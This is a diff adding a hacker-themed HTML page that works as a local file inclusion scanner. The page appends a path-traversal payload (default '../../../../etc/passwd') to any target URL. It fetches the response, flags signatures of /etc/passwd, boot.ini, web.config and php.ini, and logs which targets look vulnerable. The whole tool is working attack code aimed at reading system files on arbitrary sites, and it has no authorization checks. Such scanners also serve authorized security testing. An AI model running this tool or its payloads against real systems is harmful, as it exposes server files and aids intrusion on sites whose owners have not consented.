@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>LFI Vulnerability Tester</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+
+    video#bg-video {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw;
+      min-height: 100vh;
+      object-fit: cover;
+      opacity: 0.2;
+      z-index: -2;
+    }
+
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .container {
+      max-width: 920px;
+      margin: 50px auto;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.7);
+    }
+
+    h1, h3, label {
+      color: #c58b00;
+    }
+
+    input, textarea, pre, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.5);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+
+    button {
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #000;
+      color: red;
+    }
+
+    .section {
+      margin-top: 20px;
+    }
+
+    .history-item {
+      border-bottom: 1px solid red;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #ff8800;
+    }
+
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- 🎥 Background Video -->
+<video id="bg-video" autoplay muted loop playsinline>
+  <source src="background/34175-400954227large.mp4" type="video/mp4">
+</video>
+
+<!-- 🎵 Background Music -->
+<audio id="bg-music" loop>
+  <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg">
+</audio>
+
+<div class="container">
+  <h1>Local File Inclusion Tester</h1>
+
+  <label for="url-input">Target URL (with parameter):</label>
+  <input id="url-input" placeholder="https://example.com/view.php?file=">
+
+  <label for="payload-input">LFI Payload:</label>
+  <input id="payload-input" value="../../../../etc/passwd">
+
+  <button onclick="scanLFI()">Scan</button>
+  <button onclick="clearAll()">Clear</button>
+
+  <div class="section">
+    <h3>Scan Result</h3>
+    <pre id="result-box">{}</pre>
+  </div>
+
+  <div class="section">
+    <h3>Raw Response (partial)</h3>
+    <pre id="raw-response" style="max-height: 300px; overflow-y: auto;"></pre>
+  </div>
+
+  <div class="section">
+    <h3>History</h3>
+    <div id="history-box"></div>
+  </div>
+</div>
+
+<script>
+  const music = document.getElementById("bg-music");
+  const urlInput = document.getElementById("url-input");
+  const payloadInput = document.getElementById("payload-input");
+  const resultBox = document.getElementById("result-box");
+  const rawBox = document.getElementById("raw-response");
+  const historyBox = document.getElementById("history-box");
+
+  window.addEventListener("click", () => {
+    music.play().catch(() => {});
+  }, { once: true });
+
+  function scanLFI() {
+    const base = urlInput.value.trim();
+    const payload = payloadInput.value.trim();
+
+    if (!base || !base.includes("=")) {
+      alert("⚠️ Enter a valid URL with a file parameter (e.g. ?file=)");
+      return;
+    }
+
+    const injectionPoint = base.endsWith("=") ? base : base + (base.includes("?") ? "&" : "?");
+    const fullURL = injectionPoint + encodeURIComponent(payload);
+
+    fetch(fullURL)
+      .then(res => res.text())
+      .then(html => {
+        rawBox.textContent = html.slice(0, 3000);
+        const vulnerable = detectLFI(html);
+        resultBox.textContent = vulnerable
+          ? `🛑 Possible LFI Detected!\nSensitive file content exposed.`
+          : `✅ No LFI indicators found in response.`;
+        logHistory(fullURL, vulnerable);
+      })
+      .catch(err => {
+        resultBox.textContent = `⚠️ Error: ${err.message}`;
+        rawBox.textContent = "";
+      });
+  }
+
+  function detectLFI(html) {
+    const lfiIndicators = [
+      "root:x:0:0:",       // /etc/passwd
+      "[boot loader]",     // boot.ini
+      "<configuration>",   // web.config
+      ":\\Windows\\System32", // Windows paths
+      "[extensions]"       // php.ini
+    ];
+    return lfiIndicators.some(ind => html.includes(ind));
+  }
+
+  function logHistory(url, vulnerable) {
+    const item = document.createElement("div");
+    item.className = "history-item";
+    item.textContent = `${new Date().toLocaleString()} — ${vulnerable ? "🛑 Vulnerable" : "✅ Clean"} → ${url}`;
+    historyBox.prepend(item);
+  }
+
+  function clearAll() {
+    urlInput.value = "";
+    payloadInput.value = "../../../../etc/passwd";
+    resultBox.textContent = "{}";
+    rawBox.textContent = "";
+  }
+</script>
+
+</body>
+</html>
